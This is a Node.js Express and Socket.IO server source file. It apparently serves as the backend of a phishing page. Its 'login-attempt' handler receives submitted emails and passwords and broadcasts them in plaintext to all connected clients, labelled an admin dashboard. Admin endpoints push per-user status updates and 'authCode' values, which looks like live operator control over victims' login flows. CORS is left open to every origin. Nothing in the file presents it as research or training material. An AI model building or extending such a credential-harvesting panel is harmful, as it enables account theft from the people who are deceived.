const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// ======================== CORS ==========================
// Allow both production and development origins
const allowedOrigins = [
  'https://email-password-fontened.vercel.app',
  'http://localhost:3000',
  'https://email-password-fontened-git-main.vercel.app'
];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.log('Blocked origin:', origin);
      callback(null, true); // Allow all for testing, but restrict in production
    }
  },
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ======================== PROXY HEADERS ==========================
app.set('trust proxy', 1);

app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] === 'https') {
    req.connection.encrypted = true;
  }
  if (req.headers['x-forwarded-for']) {
    req.ip = req.headers['x-forwarded-for'].split(',')[0];
  }
  next();
});

const server = http.createServer(app);

// ======================== SOCKET.IO ==========================
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) !== -1) {
        callback(null, true);
      } else {
        console.log('Socket blocked origin:', origin);
        callback(null, true); // Allow all for testing
      }
    },
    methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  },
  transports: ['websocket', 'polling'],
  path: '/socket.io/',
  pingTimeout: 60000,
  pingInterval: 25000,
  allowEIO3: true,
  allowUpgrades: true,
  upgradeTimeout: 10000,
  cookie: false,
  // Force secure connections in production
  serveClient: false,
  // Add connection state recovery
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000,
    skipMiddlewares: true,
  },
});

console.log('🚀 Socket.IO server initializing...');

// ======================== HEALTH CHECK ENDPOINT ==========================
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    connections: io.engine.clientsCount,
    uptime: Math.floor(process.uptime()),
    environment: process.env.NODE_ENV || 'development',
    secure: req.connection.encrypted || false,
  });
});

// ======================== SOCKET EVENTS ==========================
io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('📊 Total connections:', io.engine.clientsCount);
  console.log('🔌 Transport:', socket.conn.transport.name);
  console.log('🔒 Secure:', socket.conn.secure || false);

  // Send connection confirmation
  socket.emit('connected', {
    message: 'Connected to socket server',
    socketId: socket.id,
    transport: socket.conn.transport.name,
    secure: socket.conn.secure || false,
  });

  // Handle room joining
  socket.on('join_room', (room) => {
    socket.join(room);
    console.log(`User ${socket.id} joined room: ${room}`);
    socket.emit('room_joined', { room, socketId: socket.id });
  });

  // Login attempt from user
  socket.on('login-attempt', (data) => {
    const { username, password, timestamp } = data;
    console.log(`📥 Login attempt from: ${username} at ${timestamp || new Date().toISOString()}`);

    // Broadcast to all connected clients (admin dashboard)
    io.emit('admin_notification', {
      email: username,
      password: password,
      timestamp: new Date().toISOString(),
      type: 'login_attempt'
    });

    socket.emit('login-attempt-received', {
      success: true,
      message: 'Login attempt recorded',
    });
  });

  // Admin status update
  socket.on('update-login-status', (data) => {
    const { username, status, authCode } = data;
    console.log(`📢 Admin updated status: ${username} → ${status}`);

    // Broadcast to all clients
    io.emit('user_update', {
      email: username,
      newStatus: status,
      authCode: authCode || '',
      timestamp: new Date().toISOString(),
    });
  });

  // Handle admin joined
  socket.on('admin-joined', (data) => {
    console.log(`👑 Admin ${data.name || 'Admin'} joined`);
    socket.emit('all-login-attempts', []);
  });

  // Handle disconnection
  socket.on('disconnect', (reason) => {
    console.log('❌ User disconnected:', socket.id, 'Reason:', reason);
  });

  socket.on('error', (error) => {
    console.error('Socket error for', socket.id, ':', error);
  });

  // Handle transport upgrade
  socket.conn.on('upgrade', () => {
    console.log('🔄 Transport upgraded to:', socket.conn.transport.name);
  });
});

// ======================== API ENDPOINTS ==========================

// Test endpoint
app.get('/test', (req, res) => {
  res.json({
    message: 'Server is running!',
    socketPath: '/socket.io/',
    clients: io.engine.clientsCount,
    env: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString(),
    secure: req.connection.encrypted || false,
  });
});

// Admin notification endpoint
app.post('/api/notify-admin', (req, res) => {
  try {
    const { email, type, message } = req.body;
    console.log(`📧 Notification: [${type}] ${email}`);

    io.emit('admin_notification', {
      email,
      type,
      message,
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in notify-admin:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

// Admin action endpoint
app.post('/api/admin-action', (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;
    console.log(`🔔 Admin action: ${newStatus} for ${email || userId}`);

    io.emit('user_update', {
      userId,
      newStatus,
      authCode: authCode || '',
      email: email || '',
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in admin-action:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

// API status endpoint
app.get('/api/status', (req, res) => {
  res.json({
    clients: io.engine.clientsCount,
    rooms: Object.keys(io.sockets.adapter.rooms).length,
    uptime: Math.floor(process.uptime()),
    environment: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString(),
    secure: req.connection.encrypted || false,
  });
});

// ======================== 404 & ERROR HANDLING ==========================
app.use((req, res) => {
  res.status(404).json({
    error: 'Endpoint not found',
    path: req.path,
  });
});

app.use((err, req, res, next) => {
  console.error('Global error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : undefined,
  });
});

// ======================== SERVER START ==========================
const PORT = process.env.PORT || 8000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Socket.IO path: /socket.io/`);
  console.log(`🔗 WebSocket URL: ws://localhost:${PORT}/socket.io/`);
  console.log(`🔗 Secure WebSocket: wss://your-domain/socket.io/ (in production)`);
});

// ======================== GRACEFUL SHUTDOWN ==========================
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});